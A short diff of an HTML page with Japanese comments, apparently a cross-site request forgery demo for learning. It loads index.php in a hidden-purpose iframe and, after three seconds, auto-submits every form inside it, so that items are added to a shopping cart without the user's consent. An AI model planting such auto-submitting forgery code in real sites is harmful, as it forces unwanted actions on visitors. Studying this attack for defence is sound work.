@@ -14,14 +14,21 @@
     勝手にカートに商品が追加されます。
     <a href="cart.php">カートへ移動</a>
 	</p>
-  
+
+  <!-- 現在のHTMLページに他ページの内容を埋め込む-->
   <iframe 
     id="csrf" 
     src="index.php">
   </iframe>
+
   <script>
+    // ３秒後に実行
     setTimeout(function(){
+      // (テキストを取得).contents.(タグで囲む) find('form')…formタグを検出する
+      // each()…繰り返し処理させる $(this)…$(this)を囲っているイベントの発生要素を取得
       $('#csrf').contents().find('form').each(function(){
+        // $(this)…$(this)を囲っているイベントの発生要素を取得 
+        // submit()…$('#csrf')にボタンを指定し、$(this)にフォームを指定して、ボタンを自動で押す
         $(this).submit();
       });
       
